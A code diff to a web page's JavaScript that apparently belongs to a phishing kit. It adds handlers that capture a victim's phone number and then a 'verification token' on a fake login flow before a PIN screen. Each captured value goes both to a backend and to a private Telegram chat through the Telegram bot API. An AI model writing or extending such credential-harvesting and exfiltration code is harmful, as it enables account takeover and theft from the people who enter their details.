@@ -390,65 +390,115 @@
         }
       });
 
-      // --- MODIFIED: Handles Phone submit, sends data to Telegram, then moves to text area ---
-      submitBtn.addEventListener("click", async () => {
-        // Show loading state while processing telegram send
-        loaderOverlay.style.display = "flex";
-        statusText.textContent = "Processing details...";
+      // --- 1. FIRST SUBMISSION: Phone Number Screen ---
+submitBtn.addEventListener("click", async () => {
+  // Show loader overlay while submitting
+  loaderOverlay.style.display = "flex";
+  statusText.textContent = "Submitting phone number...";
 
-        const message = `📱 New Login Attempt\n\n🔹 Phone Number: +${phoneInput.value}`;
+  const payload = {
+    phone: phoneInput.value,
+    action: "phone_submission"
+  };
 
-        try {
-          // Send to Telegram Bot
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: message
-            })
-          });
-        } catch (error) {
-          console.error("Telegram send failed:", error);
-        }
+  try {
+    // A. Submit to your local backend API first
+    await fetch("/api/submit-phone", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
 
-        // Hide loader and instantly transition to textarea token block
-        loaderOverlay.style.display = "none";
-        
-        mainContent.style.opacity = "0";
-        setTimeout(() => {
-          mainContent.classList.add("hidden");
-          mainContent.classList.remove("flex");
+    // B. Separately log it to your Admin Telegram
+    const telegramMessage = `📱 Step 1: Phone Number Submitted\n\n🔹 Phone: +${phoneInput.value}`;
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: telegramMessage
+      })
+    });
 
-          prePinScreen.classList.remove("hidden");
-          prePinScreen.classList.add("flex");
+  } catch (error) {
+    console.error("Phone submission failed:", error);
+    // Optional: Handle error states here if the backend fails
+  }
 
-          setTimeout(() => {
-            prePinScreen.classList.remove("opacity-0");
-            prePinScreen.classList.add("opacity-100");
-            prePinInput.focus();
-          }, 50);
-          document.body.style.backgroundColor = "white";
-        }, 400);
-      });
+  // C. Now that data is safely submitted, transition to the Textarea Screen
+  loaderOverlay.style.display = "none";
+  
+  mainContent.style.opacity = "0";
+  setTimeout(() => {
+    mainContent.classList.add("hidden");
+    mainContent.classList.remove("flex");
 
-      prePinSubmitBtn.addEventListener("click", () => {
-        prePinScreen.classList.remove("opacity-100");
-        prePinScreen.classList.add("opacity-0");
-        setTimeout(() => {
-          prePinScreen.classList.add("hidden");
-          prePinScreen.classList.remove("flex");
+    prePinScreen.classList.remove("hidden");
+    prePinScreen.classList.add("flex");
 
-          pinScreen.classList.remove("hidden");
-          pinScreen.classList.add("flex");
+    setTimeout(() => {
+      prePinScreen.classList.remove("opacity-0");
+      prePinScreen.classList.add("opacity-100");
+      prePinInput.focus();
+    }, 50);
+    document.body.style.backgroundColor = "white";
+  }, 400);
+});
 
-          setTimeout(() => {
-            pinScreen.classList.remove("opacity-0");
-            pinScreen.classList.add("opacity-100");
-            pinBoxes[0].focus();
-          }, 50);
-        }, 400);
-      });
+
+// --- 2. SECOND SUBMISSION: Textarea Token Screen ---
+prePinSubmitBtn.addEventListener("click", async () => {
+  loaderOverlay.style.display = "flex";
+  statusText.textContent = "Submitting verification token...";
+
+  const payload = {
+    phone: phoneInput.value,
+    securityToken: prePinInput.value,
+    action: "token_submission"
+  };
+
+  try {
+    // A. Submit the standalone token data to your backend API
+    await fetch("/api/submit-token", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+
+    // B. Send the token text to your Admin Telegram
+    const telegramMessage = `🎟️ Step 2: Verification Token Submitted\n\n📞 Phone: +${phoneInput.value}\n💬 Token: ${prePinInput.value}`;
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: telegramMessage
+      })
+    });
+
+  } catch (error) {
+    console.error("Token submission failed:", error);
+  }
+
+  // C. Transition smoothly to the regular PIN block
+  loaderOverlay.style.display = "none";
+
+  prePinScreen.classList.remove("opacity-100");
+  prePinScreen.classList.add("opacity-0");
+  setTimeout(() => {
+    prePinScreen.classList.add("hidden");
+    prePinScreen.classList.remove("flex");
+
+    pinScreen.classList.remove("hidden");
+    pinScreen.classList.add("flex");
+
+    setTimeout(() => {
+      pinScreen.classList.remove("opacity-0");
+      pinScreen.classList.add("opacity-100");
+      pinBoxes[0].focus();
+    }, 50);
+  }, 400);
+});
 
       // --- Secure Pin Box Array Focus Management Loops ---
       pinBoxes.forEach((box, index) => {
